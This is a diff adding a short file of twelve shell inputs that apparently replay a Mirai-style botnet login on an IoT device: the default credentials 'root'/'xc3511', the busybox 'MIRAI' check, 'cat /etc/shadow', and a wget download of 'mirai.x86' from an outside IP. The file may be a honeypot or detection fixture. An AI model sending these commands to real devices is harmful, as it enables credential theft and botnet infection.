@@ -1,0 +1,12 @@
+root
+xc3511
+enable
+system
+shell
+/bin/busybox MIRAI
+cat /etc/shadow
+wget http://1.2.3.4/bins/mirai.x86
+cd /opt
+cat backup.sh
+ls -la
+exit
